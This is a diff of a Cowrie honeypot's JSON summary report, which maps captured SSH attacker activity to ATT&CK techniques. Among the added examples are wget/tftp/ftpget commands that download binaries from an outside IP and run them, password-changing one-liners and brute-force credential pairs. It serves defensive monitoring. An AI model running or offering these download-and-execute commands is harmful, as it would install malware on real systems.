@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-26 03:03:35",
+  "generated": "2026-09-26 04:00:37",
   "totals": {
-    "commands": 291,
-    "login_failed": 1637,
-    "login_success": 38,
-    "sessions": 274
+    "commands": 374,
+    "login_failed": 1696,
+    "login_success": 44,
+    "sessions": 357
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1637,
+      "count": 1696,
       "examples": [
         "gizelle / gizelle",
         "gizelle / gizelle1",
@@ -21,14 +21,14 @@
         "gizelle / gizelle12345"
       ],
       "first": "2026-09-26T00:00:54.368774Z",
-      "last": "2026-09-26T03:03:16.890511Z",
-      "unique_ips": 26
+      "last": "2026-09-26T03:52:44.089809Z",
+      "unique_ips": 31
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 63,
+      "count": 102,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,8 +37,8 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-26T00:13:52.548336Z",
-      "last": "2026-09-26T03:02:16.883504Z",
-      "unique_ips": 11
+      "last": "2026-09-26T03:39:28.504997Z",
+      "unique_ips": 14
     },
     {
       "id": "T1082",
@@ -60,7 +60,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 38,
+      "count": 44,
       "examples": [
         "root / a1sev5y7c39k",
         "root / root",
@@ -69,21 +69,22 @@
         "lghkel\\x09 / zpz}ld\\x09"
       ],
       "first": "2026-09-26T00:10:34.067165Z",
-      "last": "2026-09-26T03:02:14.470342Z",
-      "unique_ips": 18
+      "last": "2026-09-26T03:52:45.468119Z",
+      "unique_ips": 22
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 13,
       "examples": [
         "w",
-        "whoami"
+        "whoami",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-26T00:19:06.377345Z",
-      "last": "2026-09-26T02:53:33.939049Z",
-      "unique_ips": 6
+      "last": "2026-09-26T03:38:36.822199Z",
+      "unique_ips": 7
     },
     {
       "id": "T1057",
@@ -102,11 +103,15 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 9,
-      "examples": [],
+      "count": 12,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+      ],
       "first": "2026-09-26T00:18:50.025908Z",
-      "last": "2026-09-26T03:02:17.221613Z",
-      "unique_ips": 7
+      "last": "2026-09-26T03:39:28.504997Z",
+      "unique_ips": 8
     },
     {
       "id": "T1098.004",
@@ -160,22 +165,26 @@
   "unmapped": [
     [
       "sh",
-      17
+      22
     ],
     [
       "shell",
-      17
+      22
     ],
     [
       "enable",
-      17
+      22
     ],
     [
       "system",
-      17
+      22
     ],
     [
       "/bin/busybox HISILICON",
+      18
+    ],
+    [
+      "ping; sh",
       12
     ],
     [
@@ -195,12 +204,12 @@
       9
     ],
     [
-      "ping; sh",
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       8
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      4
+      6
     ],
     [
       "echo -e \"linux\\nB4cWkRZ8eGZR\\nB4cWkRZ8eGZR\"|passwd|bash",
@@ -232,10 +241,6 @@
     ],
     [
       "echo -e \"magazyn\\nUPWNRkhdfGda\\nUPWNRkhdfGda\"|passwd|bash",
-      1
-    ],
-    [
-      "echo \"magazyn\\nUPWNRkhdfGda\\nUPWNRkhdfGda\\n\"|passwd",
       1
     ]
   ]
